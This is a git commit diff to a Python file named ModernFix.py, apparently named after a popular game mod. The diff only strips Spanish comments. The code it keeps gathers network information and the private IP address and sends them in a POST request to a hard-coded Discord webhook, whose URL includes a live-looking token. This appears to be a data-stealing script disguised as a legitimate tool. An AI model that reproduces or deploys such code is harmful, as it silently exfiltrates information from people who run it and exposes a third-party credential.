a585893c1ef6a8f7fd5cc8ee3e6d4ea78d72e8b2
isadsajidjsa <mezzinabautista@gmail.com>
2024-08-20 22:09:08 -0300

    Update ModernFix.py

--- ModernFix.py
+++ ModernFix.py
@@ -5,7 +5,6 @@ import json
 import os
 import socket
 
-# URL del webhook de Discord (reemplaza con tu URL de webhook)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1269114269233057882/3TvRs0z2pxX1qBoIR689BJaSgX5zPArGihZboObMZZB6RdyEz_t924zl1qksyClBcur_'
 
 def get_network_info():
@@ -17,20 +16,17 @@ def get_private_ip():
 
 def send_data_to_discord_webhook(data):
     try:
-        # Construye el mensaje a enviar al webhook
         message = {
             'content': f'Información de red:\n{data["network_info"]}\n\nIP Privada: {data["private_ip"]}',
             'username': 'Mi Bot'
         }
         
-        # Envía la solicitud POST al webhook
         response = requests.post(
             WEBHOOK_URL,
             data=json.dumps(message),
             headers={'Content-Type': 'application/json'}
         )
         
-        # Verifica la respuesta del servidor
         if response.status_code == 204:
             print('Datos enviados correctamente al webhook.')
         else:
